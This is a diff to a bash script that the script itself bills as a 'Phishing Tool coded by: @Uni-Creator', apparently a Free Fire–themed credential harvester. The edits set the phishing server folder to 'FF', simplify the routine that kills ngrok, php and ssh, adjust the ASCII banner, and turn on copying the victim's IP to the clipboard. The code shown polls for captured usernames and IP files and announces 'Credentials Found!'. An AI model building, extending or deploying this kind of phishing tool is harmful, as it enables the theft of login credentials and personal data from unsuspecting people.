@@ -7,7 +7,7 @@
 
 trap 'printf "\n";stop1;exit 1' 2
 
-#server = "FF"
+server=$"FF"
 
 #Check if all required dependencies are installed or not
 
@@ -44,21 +44,15 @@ fi
 
 stop1() {
 
-#checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-#checkphp=$(ps aux | grep -o "php" | head -n1)
-#checkssh=$(ps aux | grep -o "ssh" | head -n1)
-#if [[ $checkngrok == 'ngrok' ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
-#fi
-#if [[ $checkphp == 'php' ]]; then
+
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
-#fi
-#if [[ $checkssh == 'ssh' ]]; then
+
 pkill -f -2 ssh > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
-#fi
+
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -69,12 +63,12 @@ exit 1
 
 banner() {
 
-printf "\e[1;92m ███████╗███████╗    ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
-printf "\e[1;92m ██╔════╝██╔════╝    ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
+printf "\e[1;92m ███████╗███████╗   ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
+printf "\e[1;92m ██╔════╝██╔════╝   ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
 printf "\e[1;92m █████╗  █████╗      ██████╔╝██║███████╗███████║ \e[0m\n"
 printf "\e[1;92m ██╔══╝  ██╔══╝      ██╔═══╝ ██║╚════██║██╔══██║ \e[0m\n"
-printf "\e[1;92m ██║     ██║         ██║     ██║███████║██║  ██║ \e[0m\n"
-printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
+printf "\e[1;92m ██║     ██║          ██║      ██║███████║██║  ██║ \e[0m\n"
+printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝       ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Uni-Creator \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
@@ -326,7 +320,7 @@ printf "\n"
 
 #cat $send_ip > /dev/clip 2>&1
 #pbcopy $link > /dev/clip 2>&1
-#termux-clipboard-set $send_ip
+termux-clipboard-set $send_ip
 
 checkfound
 }
@@ -368,7 +362,7 @@ printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
 rm -rf $server/ip.txt
 fi
-#sleep 0.5
+sleep 0.5
 if [[ -e "$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
